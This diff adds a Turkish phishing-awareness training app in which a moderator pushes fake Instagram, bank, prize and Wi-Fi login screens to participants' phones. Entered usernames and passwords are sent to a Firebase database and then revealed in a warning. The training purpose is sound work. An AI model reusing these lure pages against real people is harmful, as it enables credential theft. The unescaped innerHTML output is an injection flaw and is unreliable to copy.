@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔐 Siber Güvenlik Eğitimi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .phone-frame {
+            width: 100%;
+            max-width: 380px;
+            background: #1a1a1a;
+            border-radius: 40px;
+            padding: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+
+        .screen {
+            background: white;
+            border-radius: 30px;
+            min-height: 650px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* JOIN SCREEN */
+        .join-screen {
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .join-screen h1 {
+            font-size: 1.6em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .join-screen p {
+            color: #666;
+            font-size: 0.95em;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .code-box {
+            background: #f5f5f5;
+            border: 2px solid #ddd;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .code-input {
+            width: 100%;
+            border: none;
+            background: transparent;
+            font-size: 1.4em;
+            text-align: center;
+            font-weight: bold;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            outline: none;
+        }
+
+        .code-input::placeholder {
+            color: #999;
+            font-size: 0.8em;
+        }
+
+        .join-btn {
+            width: 100%;
+            padding: 18px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .join-btn:active {
+            transform: scale(0.98);
+            background: #166fe5;
+        }
+
+        .join-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .error-box {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-size: 0.9em;
+            display: none;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* WAITING SCREEN */
+        .waiting-screen {
+            padding: 60px 30px;
+            text-align: center;
+            display: none;
+        }
+
+        .shield {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #4caf50, #45a049);
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3em;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+        }
+
+        .waiting-screen h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .waiting-screen p {
+            color: #666;
+            line-height: 1.6;
+            font-size: 0.95em;
+        }
+
+        .user-tag {
+            display: inline-block;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 10px 20px;
+            border-radius: 20px;
+            margin-top: 30px;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+
+        .connection-status {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 10px;
+            font-size: 0.8em;
+            color: #666;
+        }
+
+        /* ATTACK SCREENS */
+        .attack-screen {
+            display: none;
+        }
+
+        .attack-banner {
+            background: #ff4444;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 0.85em;
+            font-weight: 600;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Instagram */
+        .instagram-app .app-header {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: white;
+            text-align: center;
+            padding: 18px;
+            font-weight: 600;
+            font-size: 1.2em;
+        }
+
+        .instagram-app .content {
+            padding: 40px 30px;
+            text-align: center;
+        }
+
+        .insta-logo {
+            font-size: 4em;
+            margin-bottom: 30px;
+        }
+
+        /* Bank */
+        .bank-app .app-header {
+            background: #e31837;
+            color: white;
+            text-align: center;
+            padding: 18px;
+            font-weight: 600;
+            font-size: 1.2em;
+        }
+
+        .alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            margin: 15px;
+            padding: 15px;
+            border-radius: 8px;
+            color: #856404;
+            font-size: 0.9em;
+        }
+
+        /* Prize */
+        .prize-app {
+            background: linear-gradient(180deg, #667eea 0%, #764ba2 100%);
+            min-height: 100%;
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .prize-icon {
+            font-size: 4em;
+            margin-bottom: 15px;
+        }
+
+        .prize-box {
+            background: rgba(255,255,255,0.2);
+            padding: 25px;
+            border-radius: 20px;
+            margin: 20px 0;
+        }
+
+        .prize-title {
+            font-size: 1.8em;
+            font-weight: bold;
+        }
+
+        /* WiFi */
+        .wifi-app .app-header {
+            background: #2196f3;
+            color: white;
+            text-align: center;
+            padding: 18px;
+            font-weight: 600;
+            font-size: 1.2em;
+        }
+
+        .wifi-info {
+            background: white;
+            margin: 15px;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        /* Forms */
+        .form-container {
+            padding: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 1em;
+            background: #fafafa;
+            -webkit-appearance: none;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .submit-btn:active {
+            opacity: 0.8;
+        }
+
+        .btn-insta { background: #0095f6; color: white; }
+        .btn-bank { background: #e31837; color: white; }
+        .btn-prize { background: #ffd700; color: #333; }
+        .btn-wifi { background: #2196f3; color: white; }
+
+        /* Warning Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 25px;
+            padding: 35px 25px;
+            text-align: center;
+            max-width: 350px;
+            width: 100%;
+            animation: popIn 0.4s ease;
+        }
+
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-icon {
+            font-size: 4em;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            color: #ff4444;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .modal-text {
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 0.95em;
+        }
+
+        .data-box {
+            background: #ffebee;
+            border: 2px solid #ff4444;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            line-height: 1.8;
+        }
+
+        .data-box strong {
+            color: #ff4444;
+        }
+
+        .modal-btn {
+            width: 100%;
+            padding: 16px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .modal-btn:active {
+            background: #45a049;
+        }
+
+        .help-text {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e3f2fd;
+            border-radius: 10px;
+            font-size: 0.85em;
+            color: #1565c0;
+        }
+
+        .help-text strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="phone-frame">
+        <div class="screen" id="mainScreen">
+            
+            <!-- JOIN SCREEN -->
+            <div class="join-screen" id="joinScreen">
+                <h1>🔐 Oturuma Katıl</h1>
+                <p>Moderatörün verdiği kodu girin</p>
+                
+                <div class="code-box">
+                    <input type="text" 
+                           class="code-input" 
+                           id="codeInput" 
+                           placeholder="SESSION-1234"
+                           autocomplete="off"
+                           autocorrect="off"
+                           autocapitalize="characters"
+                           spellcheck="false">
+                </div>
+                
+                <button class="join-btn" id="joinBtn" onclick="tryJoin()">
+                    Katıl
+                </button>
+                
+                <div class="error-box" id="errorBox">
+                    Hata mesajı burada görünecek
+                </div>
+
+                <div class="help-text">
+                    <strong>💡 Yardım:</strong>
+                    Kod büyük harflerle yazılmalıdır.<br>
+                    Örnek: SESSION-4829
+                </div>
+            </div>
+
+            <!-- WAITING SCREEN -->
+            <div class="waiting-screen" id="waitingScreen">
+                <div class="shield">🛡️</div>
+                <h2>Güvenli Mod</h2>
+                <p>Şu an güvendesiniz.<br>Moderatör saldırı başlatırsa ekran değişecek.</p>
+                <div class="user-tag" id="userTag">👤 Kullanıcı</div>
+                <div class="connection-status" id="connStatus">🟢 Bağlantı kuruldu</div>
+            </div>
+
+            <!-- ATTACK SCREENS -->
+            <div class="attack-screen" id="attackScreen"></div>
+
+        </div>
+    </div>
+
+    <!-- WARNING MODAL -->
+    <div class="modal-overlay" id="warningModal">
+        <div class="modal-content">
+            <div class="modal-icon">⚠️</div>
+            <h2 class="modal-title">TUZAĞA DÜŞTÜNÜZ!</h2>
+            <p class="modal-text">
+                Bu bir <strong>siber saldırı simülasyonuydu!</strong><br>
+                Gerçek olsaydı bilgileriniz çalınmış olacaktı:
+            </p>
+            <div class="data-box" id="stolenData"></div>
+            <button class="modal-btn" onclick="closeWarning()">
+                Anladım, Güvenli Moda Dön
+            </button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK - UMD VERSION (Daha uyumlu) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        // FIREBASE CONFIG
+        const firebaseConfig = {
+            apiKey: "AIzaSyBdCy4UFD1-4i0jv3GyonbpA3A-6YvfZtg",
+            authDomain: "siber-ac479.firebaseapp.com",
+            databaseURL: "https://siber-ac479-default-rtdb.firebaseio.com",
+            projectId: "siber-ac479",
+            storageBucket: "siber-ac479.firebasestorage.app",
+            messagingSenderId: "207466285432",
+            appId: "1:207466285432:web:2007de2fe7f49c26f4608d"
+        };
+
+        // Initialize Firebase
+        let database;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            database = firebase.database();
+            console.log("✅ Firebase bağlantısı başarılı");
+        } catch (e) {
+            console.error("❌ Firebase hatası:", e);
+            showError("İnternet bağlantınızı kontrol edin!");
+        }
+
+        // Global variables
+        let currentSession = null;
+        let userId = null;
+        let userName = null;
+        let attackListener = null;
+
+        // Generate random name
+        function generateName() {
+            const animals = ['Aslan', 'Kartal', 'Kurt', 'Kaplan', 'Çita', 'Puma', 'Leopar', 'Jaguar'];
+            const num = Math.floor(Math.random() * 900) + 100;
+            return animals[Math.floor(Math.random() * animals.length)] + '-' + num;
+        }
+
+        // Show error
+        function showError(msg) {
+            const box = document.getElementById('errorBox');
+            box.textContent = msg;
+            box.style.display = 'block';
+            setTimeout(() => {
+                box.style.display = 'none';
+            }, 5000);
+        }
+
+        // Try to join session
+        function tryJoin() {
+            const input = document.getElementById('codeInput');
+            const btn = document.getElementById('joinBtn');
+            let code = input.value.trim().toUpperCase();
+
+            // Validation
+            if (!code) {
+                showError("Lütfen oturum kodu girin!");
+                input.focus();
+                return;
+            }
+
+            // Auto-fix: if user enters just numbers, add SESSION- prefix
+            if (/^\d+$/.test(code)) {
+                code = 'SESSION-' + code;
+            }
+
+            // Check format
+            if (!code.startsWith('SESSION-')) {
+                showError('Kod "SESSION-" ile başlamalıdır!');
+                return;
+            }
+
+            // UI update
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Bağlanıyor...';
+
+            // Generate user info
+            currentSession = code;
+            userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+            userName = generateName();
+
+            console.log("🔌 Bağlanıyor:", currentSession);
+            console.log("👤 Kullanıcı:", userName);
+
+            // Save to Firebase
+            const userRef = database.ref('sessions/' + currentSession + '/users/' + userId);
+            
+            userRef.set({
+                name: userName,
+                device: getDeviceType(),
+                joinTime: firebase.database.ServerValue.TIMESTAMP,
+                online: true
+            }).then(() => {
+                console.log("✅ Bağlantı başarılı!");
+                
+                // Setup disconnect cleanup
+                userRef.onDisconnect().remove();
+                
+                // Switch screen
+                document.getElementById('joinScreen').style.display = 'none';
+                document.getElementById('waitingScreen').style.display = 'block';
+                document.getElementById('userTag').textContent = '👤 ' + userName;
+                
+                // Start listening for attacks
+                listenForAttacks();
+                
+            }).catch((error) => {
+                console.error("❌ Bağlantı hatası:", error);
+                btn.disabled = false;
+                btn.textContent = 'Katıl';
+                showError("Bağlantı hatası: " + error.message);
+            });
+        }
+
+        // Get device type
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (ua.match(/iPhone|iPad|iPod/)) return '📱 iPhone';
+            if (ua.match(/Android/)) return '📱 Android';
+            return '📱 Telefon';
+        }
+
+        // Listen for attacks
+        function listenForAttacks() {
+            const attackRef = database.ref('sessions/' + currentSession + '/attack');
+            
+            attackListener = attackRef.on('value', (snapshot) => {
+                const attack = snapshot.val();
+                console.log("📡 Saldırı durumu:", attack);
+                
+                if (attack && attack.active === true) {
+                    showAttackScreen(attack.type);
+                } else {
+                    showWaitingScreen();
+                }
+            }, (error) => {
+                console.error("❌ Dinleme hatası:", error);
+                document.getElementById('connStatus').textContent = '🔴 Bağlantı kesildi';
+                document.getElementById('connStatus').style.color = '#ff4444';
+            });
+        }
+
+        // Show waiting screen
+        function showWaitingScreen() {
+            document.getElementById('waitingScreen').style.display = 'block';
+            document.getElementById('attackScreen').style.display = 'none';
+            document.getElementById('attackScreen').innerHTML = '';
+        }
+
+        // Show attack screen
+        function showAttackScreen(type) {
+            document.getElementById('waitingScreen').style.display = 'none';
+            document.getElementById('attackScreen').style.display = 'block';
+            
+            const screen = document.getElementById('attackScreen');
+            let html = '<div class="attack-banner">⚠️ GÜVENLİK DOĞRULAMASI GEREKLİ</div>';
+
+            switch(type) {
+                case 'instagram':
+                    html += `
+                        <div class="instagram-app">
+                            <div class="app-header">Instagram</div>
+                            <div class="content">
+                                <div class="insta-logo">📷</div>
+                                <div class="form-container">
+                                    <input type="text" class="input-field" id="inpUser" placeholder="Kullanıcı adı veya e-posta">
+                                    <input type="password" class="input-field" id="inpPass" placeholder="Şifre">
+                                    <button class="submit-btn btn-insta" onclick="submitForm('instagram')">
+                                        Giriş Yap
+                                    </button>
+                                </div>
+                                <p style="color: #385185; margin-top: 20px; font-size: 0.9em;">Şifreni mi unuttun?</p>
+                            </div>
+                        </div>
+                    `;
+                    break;
+
+                case 'bank':
+                    html += `
+                        <div class="bank-app">
+                            <div class="app-header">🏦 Güvenli Bankacılık</div>
+                            <div class="alert">
+                                <strong>⚠️ Hesabınız Askıya Alındı!</strong><br>
+                                Şüpheli işlem tespit edildi. Lütfen doğrulayın.
+                            </div>
+                            <div class="form-container">
+                                <input type="text" class="input-field" id="inpUser" placeholder="Müşteri No / TC">
+                                <input type="password" class="input-field" id="inpPass" placeholder="İnternet Şifresi">
+                                <button class="submit-btn btn-bank" onclick="submitForm('bank')">
+                                    Doğrula ve Giriş Yap
+                                </button>
+                            </div>
+                            <p style="text-align: center; color: #4caf50; font-size: 0.8em; margin-top: 10px;">
+                                🔒 SSL Sertifikalı Güvenli Bağlantı
+                            </p>
+                        </div>
+                    `;
+                    break;
+
+                case 'prize':
+                    html += `
+                        <div class="prize-app">
+                            <div class="prize-icon">🎉</div>
+                            <h2>TEBRİKLER!</h2>
+                            <div class="prize-box">
+                                <div class="prize-title">iPhone 15 Pro</div>
+                                <div>Kazandınız!</div>
+                            </div>
+                            <p style="margin-bottom: 20px;">Kargo için bilgilerinizi girin:</p>
+                            <div class="form-container" style="padding: 0;">
+                                <input type="text" class="input-field" id="inpUser" placeholder="Ad Soyad" style="margin: 5px 0;">
+                                <input type="tel" class="input-field" id="inpPass" placeholder="Telefon Numarası" style="margin: 5px 0;">
+                                <button class="submit-btn btn-prize" onclick="submitForm('prize')">
+                                    Ödülümü Al
+                                </button>
+                            </div>
+                            <p style="margin-top: 20px; font-size: 0.75em; opacity: 0.8;">
+                                ⏰ 10 dakika içinde sona eriyor!
+                            </p>
+                        </div>
+                    `;
+                    break;
+
+                case 'wifi':
+                    html += `
+                        <div class="wifi-app">
+                            <div class="app-header">📶 Wi-Fi Bağlantısı</div>
+                            <div class="wifi-info">
+                                <strong>Meb_Guest_Free</strong><br>
+                                <span style="color: #666; font-size: 0.9em;">Güvenli İnternet Erişimi</span>
+                            </div>
+                            <p style="text-align: center; color: #666; margin: 15px;">Devam etmek için giriş yapın:</p>
+                            <div class="form-container">
+                                <input type="email" class="input-field" id="inpUser" placeholder="E-posta adresi">
+                                <input type="password" class="input-field" id="inpPass" placeholder="Şifre">
+                                <button class="submit-btn btn-wifi" onclick="submitForm('wifi')">
+                                    İnternete Bağlan
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    break;
+            }
+
+            screen.innerHTML = html;
+        }
+
+        // Submit form data
+        function submitForm(attackType) {
+            const user = document.getElementById('inpUser')?.value || 'Boş';
+            const pass = document.getElementById('inpPass')?.value || 'Boş';
+
+            // Send to Firebase
+            const capturedRef = database.ref('sessions/' + currentSession + '/captured');
+            capturedRef.push({
+                userName: userName,
+                attackType: attackType,
+                username: user,
+                password: pass,
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                userAgent: navigator.userAgent.substring(0, 50)
+            });
+
+            // Show warning
+            const dataHtml = `
+                <strong>Kullanıcı:</strong> ${user}<br>
+                <strong>Şifre:</strong> ${pass}<br>
+                <strong>Tür:</strong> ${attackType.toUpperCase()}<br>
+                <strong>Saat:</strong> ${new Date().toLocaleTimeString()}
+            `;
+            document.getElementById('stolenData').innerHTML = dataHtml;
+            document.getElementById('warningModal').style.display = 'flex';
+        }
+
+        // Close warning
+        function closeWarning() {
+            document.getElementById('warningModal').style.display = 'none';
+            showWaitingScreen();
+        }
+
+        // Enter key support
+        document.getElementById('codeInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') tryJoin();
+        });
+
+        // Auto-uppercase input
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            this.value = this.value.toUpperCase();
+        });
+
+        // Console log for debugging
+        console.log("📱 Kullanıcı uygulaması yüklendi");
+        console.log("🌐 Tarayıcı:", navigator.userAgent.substring(0, 50));
+    </script>
+</body>
+</html>
